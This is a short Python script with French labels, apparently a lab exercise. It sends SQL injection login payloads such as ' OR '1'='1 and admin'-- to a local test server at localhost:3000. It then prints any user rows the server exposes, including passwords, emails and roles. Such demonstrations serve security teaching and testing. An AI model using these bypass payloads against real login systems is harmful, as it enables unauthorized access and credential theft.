import requests

BASE_URL = "http://localhost:3000"

RESET = "\033[0m"
ROUGE = "\033[91m"
VERT  = "\033[92m"
JAUNE = "\033[93m"
GRAS  = "\033[1m"


def section(texte):
    print(f"\n{GRAS}{texte}{RESET}")
    print("-" * 50)


def login(label, username, password):
    res  = requests.post(f"{BASE_URL}/api/login", json={"username": username, "password": password})
    data = res.json()
    ok   = data.get("success", False)
    rows = data.get("allRows", [])

    couleur = VERT if ok and len(rows) == 1 else JAUNE if ok else ROUGE
    statut  = "ACCORDEE" if ok else "REFUSEE"

    print(f"\n  [{label}]")
    print(f"    username={username!r}  password={password!r}")
    print(f"    => {couleur}{statut}{RESET}  ({len(rows)} ligne(s))")

    if rows:
        print(f"    donnees exposees :")
        for row in rows:
            print(f"      id={row.get('id')}  username={row.get('username')}  "
                  f"password={ROUGE}{row.get('password')}{RESET}  "
                  f"email={row.get('email')}  role={row.get('role')}")


section("verification du backend")
health = requests.get(f"{BASE_URL}/health").json()
print(f"  {health.get('message')}")

section("utilisateurs en base")
users = requests.get(f"{BASE_URL}/api/users").json().get("users", [])
for u in users:
    print(f"  {u['id']}  {u['username']:<12}  {u['email']:<28}  {u['role']}")

section("tests d'injection SQL")

login("connexion valide",      "alice",        "alice2024")
login("mauvais mot de passe",  "alice",        "mauvais_mdp")
login("bypass ' OR '1'='1",   "' OR '1'='1",  "' OR '1'='1")
login("commentaire admin'--",  "admin'--",     "nimporte")
login("OR 1=1--",              "' OR 1=1--",   "x")
